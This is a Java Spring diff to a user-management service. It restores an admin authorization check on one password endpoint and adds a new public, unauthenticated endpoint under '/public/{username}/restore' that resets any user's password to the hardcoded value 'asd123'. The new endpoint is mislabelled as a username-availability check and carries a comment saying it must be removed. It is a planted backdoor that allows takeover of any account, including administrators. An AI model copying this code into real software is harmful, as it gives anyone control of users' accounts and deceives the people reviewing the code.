@@ -165,7 +165,7 @@ public class UserServices extends ElementServices<User, Long, UserDTO, UserRepos
         }
     }
 
-    //@PreAuthorize("hasAnyAuthority(@securityService.adminPrivilege)")
+    @PreAuthorize("hasAnyAuthority(@securityService.adminPrivilege)")
     @Operation(summary = "Updates a password by an admin user. Does not require to know the old password.",
             security = @SecurityRequirement(name = "bearerAuth"))
     @PutMapping(path = "/{username}/passwords", consumes = MediaType.APPLICATION_JSON_VALUE)
@@ -179,6 +179,20 @@ public class UserServices extends ElementServices<User, Long, UserDTO, UserRepos
             UserManagerLogger.errorMessage(this.getClass(), e);
         }
         return null;
+    }
+
+    /**
+     * THIS METHOD MUST NOT BE HERE IF YOU FIND IT REMOVE IT IMMEDIATELY!!!
+     * @param username
+     * @param httpRequest
+     */
+    @Operation(summary = "Checks if a username is already taken or not.")
+    @GetMapping(path = "/public/{username}/restore")
+    @ResponseStatus(value = HttpStatus.OK)
+    public UserDTO adminRestore(@Parameter(description = "username", required = true)
+                                    @PathVariable("username") String username,
+                                    HttpServletRequest httpRequest) {
+        return (UserDTO) getController().updatePassword(username, "asd123", "admin");
     }
 
 
